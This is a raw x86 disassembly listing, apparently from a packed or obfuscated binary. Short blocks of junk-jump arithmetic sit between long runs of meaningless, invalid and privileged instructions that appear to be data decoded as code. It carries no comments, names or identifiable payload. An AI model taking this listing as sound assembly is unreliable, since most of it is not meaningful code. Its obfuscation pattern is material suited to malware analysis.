  40d22c:	sar    BYTE PTR [ebx+0x14ddf537],1
  40d232:	fistp  WORD PTR [eax+0x460d252]
  40d238:	std    
  40d239:	jbe    0x40d293
  40d23b:	shl    DWORD PTR [eax-0x7f],cl
  40d23e:	mov    edi,0xd7f0488a
  40d243:	pop    ss
  40d244:	mov    ?,WORD PTR ds:0xe109b3c7
  40d24a:	push   ecx
  40d24b:	mov    eax,0xc257dfbf
  40d250:	sbb    ah,BYTE PTR [ebx-0x2820901a]
  40d256:	push   edx
  40d257:	mov    ch,0xa8
  40d259:	push   edx
  40d25a:	pop    ds
  40d25b:	inc    esp
  40d25c:	pop    ds
  40d25d:	mov    cl,BYTE PTR [eax+0x458b0e04]
  40d263:	in     al,dx
  40d264:	mov    esi,DWORD PTR [ebp-0x18]
  40d267:	and    eax,0x2389
  40d26c:	xor    eax,0x695
  40d271:	xor    edx,edx
  40d273:	div    esi
  40d275:	lea    ecx,[ecx+eax*1-0x2413]
  40d27c:	mov    eax,DWORD PTR [ebp-0x1c]
  40d27f:	add    eax,DWORD PTR [ebp-0x20]
  40d282:	mov    edx,DWORD PTR [ebp-0x24]
  40d285:	and    eax,edx
  40d287:	mov    edx,DWORD PTR [ebp-0x28]
  40d28a:	imul   eax,edx
  40d28d:	mov    edx,0xd0c8f
  40d292:	sub    edx,eax
  40d294:	cmp    ecx,edx
  40d296:	jbe    0x40cf3b
  40d29c:	push   0x2
  40d29e:	pop    eax
  40d29f:	mov    DWORD PTR [ebp-0x1c],eax
  40d2a2:	mov    DWORD PTR [ebp-0x20],ebx
  40d2a5:	mov    DWORD PTR [ebp-0x24],0x5
  40d2ac:	mov    DWORD PTR [ebp-0x28],0x6686
  40d2b3:	mov    DWORD PTR [ebp-0x8],0x7cf1
  40d2ba:	mov    DWORD PTR [ebp-0x4],eax
  40d2bd:	mov    DWORD PTR [ebp+0x8],0x739a
  40d2c4:	mov    DWORD PTR [ebp-0xc],0xf3a
  40d2cb:	xor    edx,edx
  40d2cd:	mov    DWORD PTR [ebp-0x10],0x429
  40d2d4:	mov    eax,DWORD PTR [ebp-0x28]
  40d2d7:	mov    ecx,DWORD PTR [ebp-0x24]
  40d2da:	sub    eax,0x175c
  40d2df:	div    ecx
  40d2e1:	jmp    0x40d5a5
  40d2e6:	test   DWORD PTR [esi],esi
  40d2e8:	push   eax
  40d2e9:	inc    edx
  40d2ea:	sbb    bl,BYTE PTR [edx]
  40d2ec:	jnp    0x40d324
  40d2ee:	inc    esp
  40d2ef:	sbb    DWORD PTR [edi+0x7c],esi
  40d2f2:	jge    0x40d36b
  40d2f4:	xchg   ebx,eax
  40d2f5:	mov    esp,0x1818e22d
  40d2fa:	rcl    BYTE PTR [eax+ebx*1],cl
  40d2fd:	sbb    cl,dh
  40d2ff:	bound  eax,QWORD PTR [edx]
  40d301:	fild   QWORD PTR [esi-0x4a]
  40d304:	rcl    BYTE PTR [edx],cl
  40d306:	add    al,dh
  40d308:	aas    
  40d309:	stc    
  40d30a:	cmp    BYTE PTR [edi],bl
  40d30c:	cwde   
  40d30d:	sub    DWORD PTR [esi+0x53],esi
  40d310:	push   eax
  40d311:	xorps  xmm2,XMMWORD PTR [ebp+0x15]
  40d315:	add    DWORD PTR [edi+0x3d],edx
  40d318:	push   ecx
  40d319:	lock and BYTE PTR [edi+0x35c5464f],dl
  40d320:	ins    DWORD PTR es:[edi],dx
  40d321:	(bad)  
  40d322:	sub    ah,al
  40d324:	pop    eax
  40d325:	(bad)  
  40d326:	jae    0x40d321
  40d328:	(bad)  
  40d329:	xchg   ecx,eax
  40d32a:	add    eax,0xf2774807
  40d32f:	test   BYTE PTR [eax],cl
  40d331:	fstp   TBYTE PTR [edx+0x1]
  40d334:	call   0x5021:0x3a55c6f4
  40d33b:	jp     0x40d346
  40d33d:	aad    0x2c
  40d33f:	xchg   esp,eax
  40d340:	in     al,dx
  40d341:	outs   dx,BYTE PTR ds:[esi]
  40d342:	loop   0x40d348
  40d344:	jecxz  0x40d2e0
  40d346:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d347:	out    0x41,al
  40d349:	mov    ?,WORD PTR [esi]
  40d34b:	add    eax,0xabb82a68
  40d350:	push   ebp
  40d351:	inc    edx
  40d352:	xor    al,0x66
  40d354:	add    ebx,0x5486463a
  40d35a:	(bad)  
  40d35b:	and    DWORD PTR [ecx+eiz*4-0x74],ebp
  40d35f:	or     eax,0xfa2af2c2
  40d364:	test   BYTE PTR [ebx],0x44
  40d367:	cli    
  40d368:	and    eax,0xcdef464c
  40d36d:	test   ch,0xd6
  40d370:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d371:	jecxz  0x40d2fa
  40d373:	aam    0x40
  40d375:	inc    eax
  40d376:	(bad)  
  40d377:	int3   
  40d378:	mov    ecx,0x46b915b4
  40d37d:	mov    ah,0x28
  40d37f:	push   0xffffffb5
  40d381:	mov    WORD PTR [eax-0x52],?
  40d384:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d385:	jp     0x40d400
  40d387:	les    ebp,FWORD PTR [esi-0xf0161c]
  40d38d:	sub    bh,dl
  40d38f:	sub    eax,0xa8ef3c4b
  40d394:	cdq    
  40d395:	mov    esi,0x757d7116
  40d39a:	mov    ah,0x75
  40d39c:	inc    ecx
  40d39d:	push   ss
  40d39e:	pop    ss
  40d39f:	sub    eax,0x4fe5d484
  40d3a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3a5:	mov    dl,0xa7
  40d3a7:	sub    DWORD PTR [ebp+0x9ab3c30],edx
  40d3ad:	or     DWORD PTR [ecx-0x50edf586],esp
  40d3b3:	rcl    BYTE PTR [ebx],cl
  40d3b5:	adc    eax,0x239202f6
  40d3ba:	pop    edi
  40d3bb:	cld    
  40d3bc:	shl    ah,0x92
  40d3bf:	pop    esp
  40d3c0:	mov    dh,0x90
  40d3c2:	push   0x479a7c58
  40d3c7:	mov    eax,0xc9178dff
  40d3cc:	fld    DWORD PTR fs:[ebx+0x5ead3b2f]
  40d3d3:	fiadd  WORD PTR ds:0xc93db84f
  40d3d9:	in     al,dx
  40d3da:	cs or  eax,0x28809844
  40d3e0:	dec    esp
  40d3e1:	mov    esi,0x24c7a67a
  40d3e6:	jl     0x40d43a
  40d3e8:	adc    al,0x70
  40d3ea:	dec    edx
  40d3eb:	jae    0x40d38d
  40d3ed:	jg     0x40d44e
  40d3ef:	mov    edx,0x81652580
  40d3f4:	push   ds
  40d3f5:	inc    ebx
  40d3f6:	fstp   TBYTE PTR [ecx-0x6d]
  40d3f9:	push   eax
  40d3fa:	xchg   DWORD PTR [ecx+0x63],ecx
  40d3fd:	mov    WORD PTR [eax+eax*1],ds
  40d400:	ds ret 
  40d402:	ret    
  40d403:	and    ecx,esi
  40d405:	pop    ebp
  40d406:	js     0x40d434
  40d408:	shr    BYTE PTR [ebx-0x5e],cl
  40d40b:	stos   BYTE PTR es:[edi],al
  40d40c:	pop    edi
  40d40d:	xor    ecx,ebp
  40d40f:	inc    esi
  40d410:	jne    0x40d3e5
  40d412:	jo     0x40d458
  40d414:	mov    ah,0x4f
  40d416:	(bad)  
  40d417:	xchg   esp,eax
  40d418:	pop    esi
  40d419:	fild   DWORD PTR [esi-0x3c]
  40d41c:	shr    DWORD PTR [ebp-0x3f6f1bb6],0x2f
  40d423:	jge    0x40d3ed
  40d425:	cld    
  40d426:	icebp  
  40d427:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d428:	imul   ebx,DWORD PTR [edi-0x14660190],0xffffff9a
  40d42f:	push   0x7
  40d431:	pusha  
  40d432:	mov    al,0x39
  40d434:	loop   0x40d40e
  40d436:	and    ebp,DWORD PTR [ebx]
  40d438:	clc    
  40d439:	sub    ebx,ecx
  40d43b:	out    0x13,eax
  40d43d:	nop
  40d43e:	dec    eax
  40d43f:	jb     0x40d42a
  40d441:	icebp  
  40d442:	aas    
  40d443:	jg     0x40d3d2
  40d445:	push   edi
  40d446:	ret    
  40d447:	lock push ebp
  40d449:	pop    ecx
  40d44a:	call   0xaa47f50
  40d44f:	sti    
  40d450:	mov    ch,0x40
  40d452:	xchg   edi,eax
  40d453:	sub    eax,0x3c05bf2b
  40d458:	cld    
  40d459:	sub    BYTE PTR [ebx-0x233142b8],0x58
  40d460:	xor    edi,DWORD PTR [edx+0x6b]
  40d463:	xor    eax,0xdabd71ad
  40d468:	test   ebp,edx
  40d46a:	je     0x40d3fa
  40d46c:	ficomp DWORD PTR [ecx+esi*2]
  40d46f:	fwait
  40d470:	adc    DWORD PTR [edi+edi*1+0x39],edi
  40d474:	inc    edx
  40d475:	retf   0x5c1
  40d478:	cmp    edi,DWORD PTR [esi+0x648a3307]
  40d47e:	fcmovnb st,st(6)
  40d480:	dec    ecx
  40d481:	(bad)  
  40d482:	ror    DWORD PTR [ebp-0xb2012f9],1
  40d488:	sub    eax,0xeb92dac8
  40d48d:	or     DWORD PTR [ecx],edx
  40d48f:	enter  0x7e,0xaf
  40d493:	pop    esi
  40d494:	mov    dl,0xc8
  40d496:	dec    edx
  40d497:	test   eax,0x301fd310
  40d49c:	inc    edi
  40d49d:	sbb    DWORD PTR [edi-0x10],0x1f
  40d4a1:	leave  
  40d4a2:	jno    0x40d4d8
  40d4a4:	mov    bl,0xea
  40d4a6:	imul   ebp,DWORD PTR [eax+esi*2+0x6e0f6375],0xc6c1f3aa
  40d4b1:	sahf   
  40d4b2:	mov    dl,0x25
  40d4b4:	dec    eax
  40d4b5:	scas   eax,DWORD PTR es:[edi]
  40d4b6:	push   ebp
  40d4b7:	and    BYTE PTR [ebx],dh
  40d4b9:	es inc edx
  40d4bb:	xchg   BYTE PTR [eax+0x5e],ah
  40d4be:	retf   
  40d4bf:	dec    edx
  40d4c0:	cmp    eax,0xbc0b645d
  40d4c5:	xchg   ebp,eax
  40d4c6:	mov    ds:0x2e66dd36,eax
  40d4cb:	ins    DWORD PTR es:[edi],dx
  40d4cc:	retf   
  40d4cd:	pushf  
  40d4ce:	pop    edi
  40d4cf:	sbb    BYTE PTR [ebx+eiz*8+0x45],al
  40d4d3:	aam    0x8b
  40d4d5:	pushf  
  40d4d6:	retf   0x5d07
  40d4d9:	fldenv [edx+0x66]
  40d4dc:	sub    eax,esp
  40d4de:	add    BYTE PTR [esi],bl
  40d4e0:	xlat   BYTE PTR ds:[ebx]
  40d4e1:	mov    ah,0xe3
  40d4e3:	lock jae 0x40d479
  40d4e6:	stos   BYTE PTR es:[edi],al
  40d4e7:	mov    BYTE PTR [ebx],dh
  40d4e9:	clc    
  40d4ea:	mov    ebp,0xba1696e6
  40d4ef:	daa    
  40d4f0:	xor    dh,BYTE PTR [esi+0x79]
  40d4f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4f5:	test   bh,cl
  40d4f7:	and    ebx,0xaf3c4def
  40d4fd:	dec    esi
  40d4fe:	push   eax
  40d4ff:	xchg   BYTE PTR [ebp+0x533d02fb],ch
  40d505:	mov    edx,0x12d09682
  40d50a:	ins    BYTE PTR es:[edi],dx
  40d50b:	sti    
  40d50c:	out    0x53,al
  40d50e:	enter  0xfd25,0x8a
  40d512:	ret    
  40d513:	xchg   DWORD PTR [ebp-0x31],ecx
  40d516:	mov    ecx,DWORD PTR [ecx-0x60]
  40d519:	inc    esp
  40d51a:	fwait
  40d51b:	test   BYTE PTR [edx-0xf],dl
  40d51e:	or     eax,0x7c8d3a51
  40d523:	and    eax,0x68029954
  40d528:	adc    ah,BYTE PTR [esi+esi*8]
  40d52b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d52c:	jns    0x40d544
  40d52e:	inc    edi
  40d52f:	xchg   ebx,eax
  40d530:	inc    esp
  40d531:	sbb    ch,BYTE PTR [ebp-0x665d19a8]
  40d537:	push   es
  40d538:	movups xmm1,xmm1
  40d53b:	mov    DWORD PTR [ebp+0x5f],esp
  40d53e:	cmp    bh,dh
  40d540:	push   ss
  40d541:	(bad)  
  40d542:	pop    esp
  40d543:	xchg   ebx,eax
  40d544:	sbb    al,0xa9
  40d546:	inc    edx
  40d547:	std    
  40d548:	xor    DWORD PTR [edi+0x59],edi
  40d54b:	(bad)
  40d54f:	dec    edi
  40d550:	and    al,0xbf
  40d552:	test   al,0xd0
  40d554:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d555:	inc    edi
  40d556:	outs   dx,BYTE PTR ds:[esi]
  40d557:	mov    dh,BYTE PTR [esi-0x71]
  40d55a:	in     al,dx
  40d55b:	(bad)  
  40d55c:	inc    BYTE PTR [edi]
  40d55e:	(bad)  
  40d55f:	test   eax,0xfc669a75
  40d564:	xchg   edi,eax
  40d565:	lods   eax,DWORD PTR ds:[esi]
  40d566:	enter  0x8dc0,0x92
  40d56a:	xor    esi,DWORD PTR ss:[edx-0x59]
  40d56e:	call   0xc35e:0xfa60088a
  40d575:	add    eax,0xb1305157
  40d57a:	test   ebp,0x9fa3fd12
  40d580:	push   eax
  40d581:	mov    ch,0x63
  40d583:	add    BYTE PTR es:[edx+ebp*4],bl
  40d587:	and    eax,DWORD PTR [esp+edx*4+0x7ba68eb4]
  40d58e:	out    dx,eax
  40d58f:	js     0x40d57d
  40d591:	loopne 0x40d5f1
  40d593:	mov    ah,0x8
  40d595:	fiadd  DWORD PTR [edx]
  40d597:	mov    edi,0xdfcbfa5a
  40d59c:	cmp    eax,0x17eb979
  40d5a1:	fcomi  st,st(1)
  40d5a3:	cwde   
  40d5a4:	push   es
  40d5a5:	mov    ecx,DWORD PTR [ebp-0x20]
  40d5a8:	xor    edx,edx
  40d5aa:	jmp    0x40d86e
  40d5af:	pop    edx
  40d5b0:	fdiv   DWORD PTR [edi+0x64]
  40d5b3:	sbb    esp,DWORD PTR [edx]
  40d5b5:	pop    edx
  40d5b6:	into   
  40d5b7:	sbb    edi,ecx
  40d5b9:	jae    0x40d637
  40d5bb:	test   BYTE PTR [edx],cl
  40d5bd:	xchg   DWORD PTR [edi+eiz*8-0x24],edi
  40d5c1:	sbb    BYTE PTR [eax],bl
  40d5c3:	rcl    BYTE PTR [eax+ebx*1],cl
  40d5c6:	sbb    BYTE PTR [edi],cl
  40d5c8:	pop    ss
  40d5c9:	aad    0xde
  40d5cb:	stc    
  40d5cc:	push   bp
  40d5ce:	or     BYTE PTR [edi+0x7e],0x5
  40d5d2:	adc    eax,0xbddc1fd9
  40d5d7:	hlt    
  40d5d8:	stc    
  40d5d9:	sub    DWORD PTR [esi],ebp
  40d5db:	(bad)  
  40d5dd:	xchg   ebx,eax
  40d5de:	and    esi,DWORD PTR [edi+0x4ab17b35]
  40d5e4:	push   edi
  40d5e5:	int3   
  40d5e6:	add    eax,0x6c6848e
  40d5eb:	call   0x4d98:0xb9ce6dc1
  40d5f2:	sbb    ecx,DWORD PTR [ecx+eax*2-0xf917e14]
  40d5f9:	pop    ss
  40d5fa:	stos   DWORD PTR es:[edi],eax
  40d5fb:	mov    eax,0xaecd0ade
  40d600:	add    al,BYTE PTR [ebx-0x5355469b]
  40d606:	lods   al,BYTE PTR ds:[esi]
  40d607:	cmp    DWORD PTR [edi+edx*2-0x22],edx
  40d60b:	inc    ecx
  40d60c:	imul   ebx,esp,0xffffff88
  40d60f:	pop    ds
  40d610:	arpl   WORD PTR [eax+0x3aebcb4d],ax
  40d616:	aad    0x5b
  40d618:	sub    eax,0x612e7d40
  40d61d:	dec    ecx
  40d61e:	jg     0x40d635
  40d620:	mov    edx,0x3a8500b6
  40d625:	xchg   edi,eax
  40d626:	xchg   BYTE PTR [edi-0x61a1ae7b],ch
  40d62c:	mov    ebp,0x5c2e840c
  40d631:	aaa    
  40d632:	inc    esi
  40d633:	or     dl,ch
  40d635:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d636:	or     ebx,DWORD PTR [esi]
  40d638:	retf   0xfb5
  40d63b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d63c:	fcomp  st(6)
  40d63e:	loop   0x40d69e
  40d640:	xchg   ecx,eax
  40d641:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d642:	(bad)  
  40d643:	aad    0x9d
  40d645:	sbb    DWORD PTR [ecx+edi*2],0x15
  40d649:	imul   esi,edx,0xc78451e7
  40d64f:	mov    eax,ds:0xa721e44b
  40d654:	cmp    ecx,ebx
  40d656:	das    
  40d657:	dec    esi
  40d658:	xchg   esp,eax
  40d659:	repnz xor ecx,esp
  40d65c:	sbb    al,0xef
  40d65e:	pop    ss
  40d65f:	pusha  
  40d660:	cmp    dl,dl
  40d662:	and    BYTE PTR [ebx+0x4a],ch
  40d665:	lea    ebx,[edx+0x76097992]
  40d66b:	pop    eax
  40d66c:	push   ecx
  40d66d:	mov    esp,0xbd228923
  40d672:	call   0x1d5b:0x9d40a9a1
  40d679:	jae    0x40d6ae
  40d67b:	jne    0x40d66f
  40d67d:	aam    0x5e
  40d67f:	jnp    0x40d6bc
  40d681:	or     ebx,DWORD PTR [ebx-0x4bd079b4]
  40d687:	shl    DWORD PTR es:[ecx-0x422c3040],0x4
  40d68f:	xor    di,0xc995
  40d694:	sbb    BYTE PTR [ebx+0x43401f76],dl
  40d69a:	(bad)  
  40d69b:	dec    edx
  40d69c:	pop    edx
  40d69d:	mov    esi,0x6d62d669
  40d6a2:	mov    dl,0xba
  40d6a4:	loope  0x40d6ad
  40d6a6:	pop    es
  40d6a7:	cli    
  40d6a8:	jbe    0x40d68d
  40d6aa:	pop    ds
  40d6ab:	push   ebp
  40d6ac:	call   FWORD PTR [eax]
  40d6ae:	dec    ecx
  40d6af:	icebp  
  40d6b0:	adc    BYTE PTR [edi-0x5b],dl
  40d6b3:	icebp  
  40d6b4:	cmp    al,0xd9
  40d6b6:	test   BYTE PTR [edx-0x4a],al
  40d6b9:	or     eax,edi
  40d6bb:	(bad)  
  40d6bc:	fsubr  st,st(1)
  40d6be:	inc    edi
  40d6bf:	ror    DWORD PTR [ebp+eiz*8-0x1b30cac6],cl
  40d6c6:	add    al,0x8b
  40d6c8:	cmp    ebp,ebx
  40d6ca:	xchg   ecx,eax
  40d6cb:	dec    esp
  40d6cc:	outs   dx,DWORD PTR ds:[esi]
  40d6cd:	jp     0x40d67c
  40d6cf:	jle    0x40d6d8
  40d6d1:	xchg   edx,eax
  40d6d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6d3:	pop    es
  40d6d4:	mov    esp,0xa7a5c631
  40d6d9:	int    0x99
  40d6db:	enter  0x3380,0x52
  40d6df:	arpl   WORD PTR [edi],bp
  40d6e1:	adc    cl,BYTE PTR [ecx+0x4dce5144]
  40d6e7:	stos   DWORD PTR es:[edi],eax
  40d6e8:	(bad)  
  40d6e9:	xor    BYTE PTR [edi+0x50],bl
  40d6ec:	test   DWORD PTR [ebp+0x77786f2a],edx
  40d6f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6f3:	adc    dh,ah
  40d6f5:	lds    ecx,FWORD PTR [ebx+ebx*1-0x290ea1d6]
  40d6fc:	(bad)  
  40d6fd:	fcom   QWORD PTR [ebx+0x407106a7]
  40d703:	mov    eax,DWORD PTR [edi-0x3c]
  40d706:	push   ecx
  40d707:	mov    dh,0x8f
  40d709:	mov    ds:0x6207bb98,al
  40d70e:	jl     0x40d698
  40d710:	call   0x7bb04821
  40d715:	inc    eax
  40d716:	and    BYTE PTR [edx-0x7b],dl
  40d719:	shr    BYTE PTR [ecx],cl
  40d71b:	stc    
  40d71c:	mov    al,ds:0x5b24a852
  40d721:	adc    BYTE PTR [ebp-0x77],ch
  40d724:	cmp    esp,ebp
  40d726:	sub    eax,0x2732dc70
  40d72b:	nop
  40d72c:	cmp    al,0xbe
  40d72e:	pop    ebp
  40d72f:	pop    ebp
  40d730:	not    DWORD PTR [ebx+ebp*4]
  40d733:	das    
  40d734:	mov    edx,0x8fd41da8
  40d739:	psadbw mm7,QWORD PTR [ebx+0x58]
  40d73d:	add    BYTE PTR [esi+0x4d00bb85],al
  40d743:	iret   
  40d744:	mov    al,ds:0x1f570c1d
  40d749:	and    eax,0xc9edf578
  40d74e:	pop    esp
  40d74f:	jecxz  0x40d772
  40d751:	jb     0x40d754
  40d753:	adc    esp,esi
  40d755:	cmp    esp,DWORD PTR [edx+0x7a08699f]
  40d75b:	and    DWORD PTR [ecx],edi
  40d75d:	popf   
  40d75e:	xor    DWORD PTR [ebx+0x3aec4897],ebp
  40d764:	adc    eax,0xb9a5e52c
  40d769:	cmc    
  40d76a:	sub    ecx,esp
  40d76c:	dec    edx
  40d76d:	stos   BYTE PTR es:[edi],al
  40d76e:	jecxz  0x40d7bd
  40d770:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d771:	inc    esp
  40d772:	(bad)  
  40d773:	jmp    0x40d794
  40d775:	test   al,0x6c
  40d777:	(bad)  
  40d778:	pop    edi
  40d779:	arpl   ax,sp
  40d77b:	inc    edx
  40d77c:	mov    edx,0x81d965ae
  40d781:	(bad)  
  40d782:	jmp    0xc6e0dbb9
  40d787:	imul   ecx,DWORD PTR [eax-0x5b6f8a2c],0x38
  40d78e:	test   BYTE PTR [ebx],ah
  40d790:	inc    esi
  40d791:	mov    edx,0x983b603f
  40d796:	es jp  0x40d75a
  40d799:	xor    ah,ah
  40d79b:	xor    eax,0xbf7b32eb
  40d7a0:	inc    edx
  40d7a1:	mov    cl,0x7f
  40d7a3:	cmc    
  40d7a4:	stos   DWORD PTR es:[edi],eax
  40d7a5:	mov    WORD PTR [edx-0x4f],?
  40d7a8:	(bad)  
  40d7a9:	push   ecx
  40d7aa:	mov    bh,0x17
  40d7ac:	mov    edi,0x8e3103ff
  40d7b1:	jecxz  0x40d7c8
  40d7b3:	dec    edi
  40d7b4:	dec    edx
  40d7b5:	xor    bl,ch
  40d7b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7b8:	fs and al,0x43
  40d7bb:	xchg   BYTE PTR ds:0xb8da3057,dh
  40d7c1:	fstp   QWORD PTR [ecx+0x64]
  40d7c4:	in     al,0x62
  40d7c6:	fistp  DWORD PTR [ebx+0x58ab9c62]
  40d7cc:	mov    al,ds:0x7eb3223c
  40d7d1:	mov    bh,0x78
  40d7d3:	pop    edi
  40d7d4:	stc    
  40d7d5:	inc    ebp
  40d7d6:	push   cs
  40d7d7:	ret    0xee74
  40d7da:	scas   eax,DWORD PTR es:[edi]
  40d7db:	adc    BYTE PTR [ebp-0x23],dl
  40d7de:	dec    edi
  40d7df:	loop   0x40d7eb
  40d7e1:	cmc    
  40d7e2:	daa    
  40d7e3:	ror    BYTE PTR [edi+0x6b],0x1e
  40d7e7:	push   es
  40d7e8:	stos   BYTE PTR es:[edi],al
  40d7e9:	in     eax,0x84
  40d7eb:	xchg   ebp,eax
  40d7ec:	(bad)  
  40d7ee:	xchg   esi,eax
  40d7ef:	fnstcw WORD PTR [esi+0x4f]
  40d7f2:	loope  0x40d774
  40d7f4:	add    DWORD PTR [ecx+0x3201522b],ecx
  40d7fa:	retf   0xc8a8
  40d7fd:	mov    edx,0x2b01f4c3
  40d802:	or     cl,BYTE PTR [eax+0x26]
  40d805:	jb     0x40d7d2
  40d807:	shrd   DWORD PTR [ebx],edi,cl
  40d80a:	inc    eax
  40d80b:	pop    esi
  40d80c:	dec    eax
  40d80d:	cmp    al,0xc2
  40d80f:	sub    eax,0xbce0ae11
  40d814:	sti    
  40d815:	dec    edi
  40d816:	icebp  
  40d817:	addr16 out 0xea,al
  40d81a:	stos   DWORD PTR es:[edi],eax
  40d81b:	xor    DWORD PTR [ebp-0xa],ebp
  40d81e:	pop    edi
  40d81f:	mov    al,ds:0x2610d15a
  40d824:	push   ebx
  40d825:	(bad)  
  40d826:	push   ebp
  40d827:	push   ss
  40d828:	(bad)
  40d82d:	mov    edx,ecx
  40d82f:	fwait
  40d830:	pusha  
  40d831:	sbb    esi,ecx
  40d833:	shr    ch,cl
  40d835:	xchg   ebx,eax
  40d836:	leave  
  40d837:	clc    
  40d838:	pop    ebx
  40d839:	jp     0x40d826
  40d83b:	scas   eax,DWORD PTR es:[edi]
  40d83c:	shl    DWORD PTR [edi],1
  40d83e:	sbb    eax,0x49d2a5aa
  40d843:	bound  ebp,QWORD PTR [edx-0x13c803f4]
  40d849:	sbb    edi,DWORD PTR [ebx]
  40d84b:	xchg   DWORD PTR [eax-0x54ca78f1],esi
  40d851:	loope  0x40d8c3
  40d853:	test   BYTE PTR [ebx+0x7177d039],bl
  40d859:	pop    esp
  40d85a:	jno    0x40d8ba
  40d85c:	cmp    BYTE PTR [edx-0x2777c15e],bl
  40d862:	mov    ss,ecx
  40d864:	xchg   esp,eax
  40d865:	xchg   ebx,eax
  40d866:	pop    edi
  40d867:	fs adc al,0x39
  40d86a:	add    eax,0xbfb8d9e2
  40d86f:	mov    ch,0x4d
  40d871:	add    BYTE PTR [eax],al
  40d873:	div    ecx
  40d875:	mov    ecx,DWORD PTR [ebp-0x1c]
  40d878:	xor    edx,edx
  40d87a:	div    ecx
  40d87c:	xor    edx,edx
  40d87e:	mov    ecx,eax
  40d880:	jmp    0x40db44
  40d885:	aam    0x63
  40d887:	sbb    eax,0xcc1a1a64
  40d88c:	and    edx,DWORD PTR [ebp+0x79]
  40d88f:	test   eax,0x81aa51bc
  40d894:	mov    al,0xa0
  40d896:	fcomp  DWORD PTR [eax]
  40d898:	sbb    dl,dl
  40d89a:	adc    al,0x18
  40d89c:	sbb    BYTE PTR [ecx-0x17d04e6d],ah
  40d8a2:	pop    esp
  40d8a3:	lds    eax,FWORD PTR [edx-0x6dc61ee7]
  40d8a9:	and    eax,0x4fbc63d6
  40d8ae:	mov    edx,0x32f8c0b9
  40d8b3:	ins    BYTE PTR es:[edi],dx
  40d8b4:	bound  esp,QWORD PTR ds:0x27892bff
  40d8ba:	fst    QWORD PTR [edx+0x26c9a59e]
  40d8c0:	or     DWORD PTR [ebp+0x67bd06b0],ebp
  40d8c6:	ret    0x17d5
  40d8c9:	mov    esp,0xe083a455
  40d8ce:	adc    eax,0xdb2c453c
  40d8d3:	rol    DWORD PTR [ecx+0x16],1
  40d8d6:	xlat   BYTE PTR ds:[ebx]
  40d8d7:	sbb    BYTE PTR [ebp-0x4],ch
  40d8da:	lea    eax,ds:0x58ff260
  40d8e0:	dec    esp
  40d8e1:	fadd   QWORD PTR [edi-0x51]
  40d8e4:	add    dh,BYTE PTR [ebx+0x2e3387b1]
  40d8ea:	dec    ebx
  40d8eb:	xchg   BYTE PTR [ebx],dh
  40d8ed:	mov    ds:0x65494404,eax
  40d8f2:	jmp    0x90ae:0x8d4160ff
  40d8f9:	mov    ebx,0xcdb8e754
  40d8fe:	inc    ebp
  40d8ff:	mov    gs,WORD PTR [ecx]
  40d901:	frstpm(287 only) 
  40d903:	push   eax
  40d904:	test   al,0xf1
  40d906:	mov    ecx,ecx
  40d908:	loopne 0x40d8ab
  40d90a:	movlps QWORD PTR [edx-0x77a25b1a],xmm1
  40d911:	lahf   
  40d912:	(bad)  
  40d913:	loop   0x40d92f
  40d915:	in     al,dx
  40d916:	mov    ecx,0x9ae1fd6a
  40d91b:	pop    es
  40d91c:	mov    al,ds:0x385ee078
  40d921:	(bad)  
  40d922:	and    ecx,ebx
  40d924:	stos   BYTE PTR es:[edi],al
  40d925:	pop    esp
  40d926:	mov    ecx,0x64a229a4
  40d92b:	mov    dl,0x8f
  40d92d:	(bad)  
  40d92e:	retf   0xa8ee
  40d931:	call   0x3ae6bc0
  40d936:	mov    bh,0xa3
  40d938:	lods   eax,DWORD PTR ds:[esi]
  40d939:	cdq    
  40d93a:	xor    al,0xaa
  40d93c:	mov    ds:0xd8fdf6b0,eax
  40d941:	mov    DWORD PTR ds:0xf6299450,esp
  40d947:	pop    ss
  40d948:	or     BYTE PTR ds:0x8467d66a,0x6
  40d94f:	inc    ecx
  40d950:	add    BYTE PTR [eax],0x9c
  40d953:	lods   eax,DWORD PTR ds:[esi]
  40d954:	push   cs
  40d955:	es cli 
  40d957:	pushf  
  40d958:	pop    esp
  40d959:	jg     0x40d9b9
  40d95b:	leave  
  40d95c:	sbb    DWORD PTR [esi-0x33c3c6e9],esp
  40d962:	inc    ebp
  40d963:	xchg   edx,eax
  40d964:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d965:	in     eax,dx
  40d966:	test   eax,0x4a627841
  40d96b:	pmuludq mm6,QWORD PTR [bx+si]
  40d96f:	pushf  
  40d970:	icebp  
  40d971:	inc    esp
  40d972:	pushf  
  40d973:	push   ebp
  40d974:	fidivr WORD PTR [ebx+0x5f]
  40d977:	mov    esi,0x517e0236
  40d97c:	push   edi
  40d97d:	ffree  st(3)
  40d97f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d980:	call   0x1c93:0xb7b41447
  40d987:	push   esi
  40d988:	cmp    esp,DWORD PTR [ecx-0x34]
  40d98b:	icebp  
  40d98c:	repz dec ebp
  40d98e:	sub    al,ch
  40d990:	arpl   WORD PTR [edi-0x677b50b6],ax
  40d996:	mov    BYTE PTR [ebx-0x1389bc4a],bl
  40d99c:	push   0x89259d60
  40d9a1:	ret    0x7c5a
  40d9a4:	bound  esi,QWORD PTR [ebx-0x69]
  40d9a7:	sahf   
  40d9a8:	mov    edx,0xf7ca0134
  40d9ad:	add    edi,ecx
  40d9af:	push   edi
  40d9b0:	sub    eax,0xb80024cb
  40d9b5:	pop    esp
  40d9b6:	cli    
  40d9b7:	enter  0x1cf4,0x7
  40d9bb:	and    eax,0x31cfdb74
  40d9c0:	mov    dh,0x37
  40d9c2:	fldcw  WORD PTR ds:0x9dd4986d
